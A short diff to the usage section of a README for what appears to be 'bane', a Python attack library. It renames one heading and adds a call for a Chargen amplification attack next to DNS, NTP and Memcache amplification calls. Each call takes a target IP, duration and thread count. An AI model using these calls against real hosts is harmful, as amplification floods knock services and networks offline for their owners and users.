@@ -155,5 +155,7 @@ II-Usage:
 <br>bane.dns_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
 <h4>NTP amplification attack:</h4>
 <br>bane.ntp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
-<h4>memcache amplification attack:</h4>
+<h4>Memcache amplification attack:</h4>
 <br>bane.memcache_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
+<h4>Chargen amplification attack:</h4>
+<br>bane.chargen_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
